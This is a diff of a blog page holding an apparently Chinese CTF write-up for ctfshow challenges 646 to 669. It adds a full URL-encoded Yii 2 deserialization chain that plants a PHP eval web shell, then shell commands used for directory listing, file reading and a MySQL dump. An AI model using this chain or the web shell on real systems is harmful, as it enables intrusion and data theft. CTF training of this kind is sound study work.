@@ -419,7 +419,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    998
+                    1.6k
                 </div>
                 
 
@@ -459,6 +459,8 @@
 <p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211210210217403.png" alt="image-20211210210217403"></p>
 <h2 id="643"><a href="#643" class="headerlink" title="643"></a>643</h2><p>ping 命令模块 抓包  输入命令 ls  发现secret.txt文件  然后进入url解码</p>
 <p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211210213332983.png" alt="image-20211210213332983"></p>
+<h2 id="646"><a href="#646" class="headerlink" title="646"></a>646</h2><p>根据包含信息，拿到init.php的源码</p>
+<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210172627619.png" alt="image-20220210172627619"></p>
 <h2 id="647"><a href="#647" class="headerlink" title="647"></a>647</h2><p> !==逻辑    striopos传数组会返回null    因此只需要找到无参数的返回数组的函数</p>
 <p>flag_647=ctfshow{e6ad8304cdb562971999b476d8922219}</p>
 <p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211212193212450.png" alt="image-20211212193212450"></p>
@@ -593,7 +595,42 @@ curl http://172.2.234.5/public/Readme.txt
 <p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210105421151.png" alt="image-20220210105421151"></p>
 <p>进行反汇编或者直接0101打开，得到elf文件：</p>
 <p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210105233107.png" alt="image-20220210105233107"></p>
+<p>flag_663=ctfshow{fa5cc1fb0bfc986d1ef150269c0de197}</p>
+<h2 id="664"><a href="#664" class="headerlink" title="664"></a>664</h2><p>读取nginx的配置文件，得到：</p>
+<p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220210164706238.png" alt="image-20220210164706238"></p>
+<p>发现开了端口 8888 </p>
+<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210164736957.png" alt="image-20220210164736957"></p>
+<p>访问8888端口，发现为yii的框架，存在反序列化入口，具体怎么找出来，生成html分析表单即可（一脸懵） </p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9948#toc-4">https://xz.aliyun.com/t/9948#toc-4</a> yii 2.0.42 最新反序列化利用全集</p>
+<p>直接getshell（大懵特懵）</p>
+<pre class="line-numbers language-none"><code class="language-none">select sys_eval('sudo curl  -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "UnserializeForm[ctfshowUnserializeData]=O%3A32%3A%22Codeception%5CExtension%5CRunProcess%22%3A2%3A%7Bs%3A43%3A%22%00Codeception%5CExtension%5CRunProcess%00processes%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3BO%3A35%3A%22Symfony%5CComponent%5CString%5CLazyString%22%3A1%3A%7Bs%3A42%3A%22%00Symfony%5CComponent%5CString%5CLazyString%00value%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22yii%5Crest%5CCreateAction%22%3A2%3A%7Bs%3A11%3A%22checkAccess%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A16%3A%22yii%5Cgii%5CCodeFile%22%3A3%3A%7Bs%3A9%3A%22operation%22%3BN%3Bs%3A4%3A%22path%22%3Bs%3A28%3A%22%2Fvar%2Foa%2Fweb%2Fassets%2Fshell.php%22%3Bs%3A7%3A%22content%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7Di%3A1%3Bs%3A4%3A%22save%22%3B%7Ds%3A2%3A%22id%22%3Bs%3A0%3A%22%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7D%7D%7D%7Ds%3A40%3A%22%00Codeception%5CExtension%5CRunProcess%00output%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3BO%3A35%3A%22Symfony%5CComponent%5CString%5CLazyString%22%3A1%3A%7Bs%3A42%3A%22%00Symfony%5CComponent%5CString%5CLazyString%00value%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22yii%5Crest%5CCreateAction%22%3A2%3A%7Bs%3A11%3A%22checkAccess%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A16%3A%22yii%5Cgii%5CCodeFile%22%3A3%3A%7Bs%3A9%3A%22operation%22%3BN%3Bs%3A4%3A%22path%22%3Bs%3A28%3A%22%2Fvar%2Foa%2Fweb%2Fassets%2Fshell.php%22%3Bs%3A7%3A%22content%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7Di%3A1%3Bs%3A4%3A%22save%22%3B%7Ds%3A2%3A%22id%22%3Bs%3A0%3A%22%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7D%7D%7D%7D" "http://oa:8888/index.php?r=site%2Funserialize&amp;key=flag_663%3Dctfshow%7Bfa5cc1fb0bfc986d1ef150269c0de197%7D"');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p>开始RCE</p>
+<pre class="line-numbers language-none"><code class="language-none">select sys_eval('sudo curl -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "1=system(whoami);" "http://oa:8888/assets/shell.php"');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210165040352.png" alt="image-20220210165040352">函数被ban掉了</p>
+<p>扫描当前目录</p>
+<pre class="line-numbers language-none"><code class="language-none">select sys_eval('sudo curl -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "1=print_r(scandir(chr(46)));" "http://oa:8888/assets/shell.php"');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210165303990.png" alt="image-20220210165303990"></p>
+<p>继续扫描上级目录</p>
+<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210170709439.png" alt="image-20220210170709439"></p>
+<p>继续上级目录扫描</p>
+<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210170806817.png" alt="image-20220210170806817"></p>
+<p>发现flag664.php</p>
+<pre class="line-numbers language-none"><code class="language-none">select sys_eval('sudo curl -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "1=print_r(file_get_contents(chr(46).chr(46).chr(47).chr(46).chr(46).chr(47).chr(102).chr(108).chr(97).chr(103).chr(54).chr(54).chr(52).chr(46).chr(112).chr(104).chr(112)));" "http://172.2.78.5:8888/assets/shell.php"');
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210171739073.png" alt="image-20220210171739073"></p>
+<p>flag_664=ctfshow{35802d184dba134bdc8d0d23e09051f7}</p>
+<h2 id="666"><a href="#666" class="headerlink" title="666"></a>666</h2><pre class="line-numbers language-none"><code class="language-none">5.txt:
+1=$conn = new mysqli('localhost','root','root','ctfshow');$res = $conn-&gt;query("select * from ctfshow_secret");if($res){$row=$res-&gt;fetch_array(MYSQLI_BOTH);}echo $row[0];$conn-&gt;close();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220210211239119.png" alt="image-20220210211239119"></p>
+<p>flag_666=ctfshow{bb4053583279be4e3be880f30ce3e53e</p>
+<h2 id="667"><a href="#667" class="headerlink" title="667"></a>667</h2><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210174146327.png" alt="image-20220210174146327"></p>
+<p>flag_667=ctfshow{503a075560764e3d116436ab73d7a560}</p>
+<h2 id="668"><a href="#668" class="headerlink" title="668"></a>668</h2><h2 id="669"><a href="#669" class="headerlink" title="669"></a>669</h2>
                 
             </div>
             <hr/>
@@ -1125,7 +1162,7 @@ curl http://172.2.234.5/public/Readme.txt
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">10.7k</span>
+                        class="white-color">11.4k</span>
             
             
             
